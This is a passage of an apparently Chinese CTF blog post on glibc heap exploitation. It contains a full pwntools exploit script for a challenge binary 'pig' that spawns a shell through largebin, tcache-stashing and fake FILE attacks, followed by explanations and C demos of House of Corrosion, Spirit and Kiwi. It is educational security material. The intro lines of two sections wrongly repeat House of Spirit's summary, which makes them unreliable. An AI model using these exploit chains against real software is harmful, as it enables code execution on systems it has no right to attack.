class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;182.92.203.154&#x27;, 35264)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, content</span>):</span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">user</span>):</span><br><span class="line">    Menu(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">3</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;source ./libcdebug/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#----- prepare tcache_stashing_unlink_attack</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)    <span class="comment"># B0~B4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xb0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B5 split 0x160 to 0xc0 and 0xa0</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># B6 split 0x190 to 0xf0 and 0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- leak libc_base and heap_base</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x48</span>) <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">16</span>)<span class="comment">#put A16 into unsorted</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># B8   make A16 into largebin</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(rl()) - <span class="number">0x1ebfe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(rl()) - <span class="number">0x13940</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ebfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A17</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A19</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x168</span>) <span class="comment"># B9</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attack</span></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x118</span>) <span class="comment"># C1</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, payload) <span class="comment"># C3 change fake FILE _chain</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span></span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1ED560</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">Menu(<span class="number">5</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h1><h2 id="概要-7"><a href="#概要-7" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>需要一个UAF漏洞</li><li>可以分配较大的堆块（size &lt;=0x3b00)</li></ol><p><strong>利用效果:</strong></p><p><strong>有效版本:</strong>2.32以前</p><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>首先要先知道 global_max_fast 是 GLIBC 用来储存 fastbin 链表能够储存的最大大小，其默认值为 0x80，也就是 Fastbin 的默认 Size 范围是在 [0x20, 0x80]。</p><p>而此方法，其根本的思想就是通过往 global_max_fast 写入一个很大的值，来造成 fastbinsY 数组溢出。如果利用其他漏洞在这个位置写一个很大的值，会使得在 malloc 和 free 堆块的时候，很大 Size 堆块都被判定为是 fastbin 类型的堆块，fastbinsY 是在 GLIBC 上储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin 链表预留了十个指针。</p><p>这意味着，如果有 SIZE 超过 0xB0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY 的最大范围，造成数组越界。可以使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY 首地址的差值。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (delta * 2) + 0x20</span><br></pre></td></tr></table></figure><p>不过也可以看出只能覆写比fastbinY高处的东西</p><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h2 id="概要-8"><a href="#概要-8" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>能free指定地址</li></ol><p><strong>利用效果:</strong>获得包含目标地址的chunk</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>在可控区域伪造或寻找一个fake_chunk,并free它,使其进入fastbin中</p><p>fake_chunk的条件</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li><strong>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</strong></li><li>fake chunk 的 <strong>size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</strong></li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> ,且prev_size要和fakechunk的对应</li><li>不能double free</li></ul><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h2 id="概要-9"><a href="#概要-9" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>利用条件:</strong></p><ol><li>能够触发<code>__malloc_assert</code>,通常是堆溢出导致</li><li>能够任意写,修改<code>_IO_file_sync</code>和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><p><strong>注意:</strong>因为house of kiwi要求能够修改libio中的vtable,这在许多版本glibc中是被禁止的,所以house of kiwi中提到的这条利用链不一定能够实现,但是其为我们提供了一个显式调用IO的方法,即通过assert触发fflush(stderr),从而调用stderr的vtable的sync,可以利用修改vtable偏移去调用别的vtable指针</p><h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><h3 id="malloc-assert"><a href="#malloc-assert" class="headerlink" title="__malloc_assert"></a>__malloc_assert</h3><ul><li><p>GLIBC 2.32/malloc.c:288</p><p>glibc中ptmalloc部分,从以前到现在都存在一个assret断言的问题,此处存在一个fflush(stderr)的函数调用,其中会调用_IO_file_jumps中的sync指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line"><span class="built_in">fflush</span> (stderr);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何触发assert?在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk))位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p></li><li><p>GLIBC 2.32/malloc.c:2394</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p><ol><li>old_size &gt;= 0x20;</li><li>old_top.prev_inuse = 0;</li><li>old_top页对齐</li></ol><p>通过这里也可以触发assert</p></li></ul><p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且可以发现调用指针时RDX寄存器的值始终为<code>IO_helper_jumps</code>指针,这样就联系到了setcontext</p><p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span></span><br><span class="line"><span class="comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span 